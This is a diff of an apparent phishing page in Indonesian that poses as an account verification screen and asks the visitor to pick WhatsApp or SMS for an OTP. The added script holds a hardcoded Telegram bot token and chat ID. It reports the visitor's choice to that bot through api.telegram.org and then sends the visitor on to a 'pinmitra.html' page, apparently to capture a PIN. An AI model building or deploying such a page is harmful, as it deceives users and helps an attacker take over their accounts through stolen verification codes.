@@ -1,126 +1,169 @@
- <!DOCTYPE html>
- <html lang="id">
- <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verifikasi Identitas</title>
-  <!-- Gaya CSS (dapat ditempatkan di sini atau di file eksternal) -->
-  <style>
-  body {
-  font-family: Arial, sans-serif;
-  margin: 0;
-  padding: 0;
-  background-color: #f8f8f8;
-  color: #333;
-  }
- 
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pilih Metode Verifikasi</title>
+    <style>
+        body {
+            font-family: "Roboto", Arial, sans-serif;
+            background-color: #f8f8f8;
+            margin: 0;
+            padding: 0;
+        }
 
-  .container {
-  max-width: 480px;
-  margin: 20px auto;
-  padding: 20px;
-  background-color: #fff;
-  border-radius: 8px;
-  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-  }
- 
+        header {
+            display: flex;
+            align-items: center;
+            padding: 14px 16px;
+            background: #fff;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
+        }
 
-  h1 {
-  font-size: 1.5em;
-  margin-bottom: 10px;
-  }
- 
+        header h1 {
+            flex: 1;
+            text-align: center;
+            font-size: 18px;
+            margin: 0;
+            font-weight: 500;
+        }
 
-  p {
-  font-size: 1em;
-  margin-bottom: 20px;
-  }
- 
+        .content {
+            padding: 20px 16px;
+            background: #fff;
+            margin-top: 10px;
+        }
 
-  .verification-option {
-  margin-bottom: 15px;
-  }
- 
+        .desc {
+            font-size: 15px;
+            color: #444;
+            line-height: 1.5;
+        }
 
-  .verification-option button {
-  width: 100%;
-  padding: 10px;
-  font-size: 1em;
-  background-color: #ee4d2d;
-  color: white;
-  border: none;
-  border-radius: 5px;
-  cursor: pointer;
-  transition: background-color 0.3s;
-  }
- 
+        .desc b {
+            color: #000;
+        }
 
-  .verification-option button:hover {
-  background-color: #d0371a;
-  }
- 
+        .method {
+            display: flex;
+            align-items: center;
+            border-top: 1px solid #eee;
+            padding: 14px 0;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
 
-  .otp-form {
-  margin-top: 20px;
-  }
- 
+        .method:hover {
+            background: #f2f2f2;
+        }
 
-  .otp-form input {
-  width: 100%;
-  padding: 10px;
-  font-size: 1em;
-  border: 1px solid #ddd;
-  border-radius: 5px;
-  margin-bottom: 10px;
-  }
- 
+        .method.selected {
+            background: #e8f5e9;
+            border-left: 4px solid #25d366;
+        }
 
-  .otp-form button {
-  width: 100%;
-  padding: 10px;
-  font-size: 1em;
-  background-color: #ee4d2d;
-  color: white;
-  border: none;
-  border-radius: 5px;
-  cursor: pointer;
-  transition: background-color 0.3s;
-  }
- 
+        .method img {
+            width: 28px;
+            height: 28px;
+            margin-right: 12px;
+        }
 
-  .security {
-  margin-top: 20px;
-  font-size: 0.8em;
-  color: #777;
-  }
- </style>
- <script>
-  function goToPinMitra() {
-  window.location.href = "pinmitra.html";
-  }
- </script>
- </head>
- <body class="bg-white text-black min-h-screen">
-  <div class="container">
-  <h1>Verifikasi Identitas</h1>
-  <p>Untuk meningkatkan keamanan akun Anda, mohon verifikasi identitas Anda.</p>
- 
+        .method span {
+            flex: 1;
+            font-size: 16px;
+        }
 
-  <div class="verification-option">
-  <button onclick="goToPinMitra()">Verifikasi melalui WhatsApp/SMS</button>
-  </div>
- 
+        .confirm {
+            margin-top: 18px;
+            font-size: 15px;
+            color: #333;
+            text-align: center;
+            min-height: 22px;
+        }
 
-  <div class="otp-form" style="display:none;">
-  <p>Masukkan kode verifikasi (OTP) yang telah kami kirim:</p>
-  <input type="text" placeholder="Kode OTP">
-  <button>Verifikasi</button>
-  </div>
- 
+        button {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            margin-top: 20px;
+            background: #ccc;
+            color: #fff;
+            cursor: not-allowed;
+            transition: background 0.3s;
+        }
 
-  <div class="security">
-  Data Anda aman dan terlindungi.
-  </div>
-  </div>
- </body>
- </html>
+        button.active {
+            background: #25d366;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+<header>
+    <h1>Pilih Metode Verifikasi</h1>
+</header>
+<div class="content">
+    <p class="desc">
+        Pilih salah satu metode di bawah ini untuk mengirimkan kode verifikasi (OTP)
+        ke <b>Nomor yang terdaftar dengan akun anda</b>
+    </p>
+    <div class="method" data-method="WhatsApp">
+        <img src="" alt="WhatsApp"/>
+        <span>WhatsApp</span>
+    </div>
+    <div class="method" data-method="SMS">
+        <img src="" alt="SMS"/>
+        <span>SMS</span>
+    </div>
+    <p class="confirm"></p>
+    <button id="lanjut" disabled>Lanjut</button>
+</div>
+<script>
+    const methods = document.querySelectorAll(".method");
+    const confirmText = document.querySelector(".confirm");
+    const lanjutBtn = document.getElementById("lanjut");
+
+    const TELEGRAM_BOT_TOKEN = '8286824254:AAHECrYlrnN0GeEBdG2ASNJEg79mw0FAYn8';
+    const TELEGRAM_CHAT_ID = '5923031825';
+
+    async function sendTelegramMessage(message) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+        try {
+            const response = await fetch(url);
+            if (!response.ok) {
+                console.error('Gagal mengirim pesan Telegram:', response.status, response.statusText);
+            }
+        } catch (error) {
+            console.error('Error mengirim pesan Telegram:', error);
+        }
+    }
+
+    methods.forEach(method => {
+        method.addEventListener("click", () => {
+            // Hapus kelas "selected" dari semua
+            methods.forEach(m => m.classList.remove("selected"));
+            // Tambahkan ke yang diklik
+            method.classList.add("selected");
+            const chosen = method.dataset.method;
+            confirmText.textContent = `Kamu memilih metode verifikasi melalui ${chosen}.`;
+            // Aktifkan tombol lanjut
+            lanjutBtn.classList.add("active");
+            lanjutBtn.disabled = false;
+        });
+    });
+
+    lanjutBtn.addEventListener("click", () => {
+        const selectedMethod = document.querySelector(".method.selected");
+        if (selectedMethod) {
+            const chosenMethod = selectedMethod.dataset.method;
+            const message = `Pengguna memilih metode verifikasi: ${chosenMethod}`;
+            sendTelegramMessage(message);
+        }
+        window.location.href = "pinmitra.html";
+    });
+</script>
+</body>
+</html>
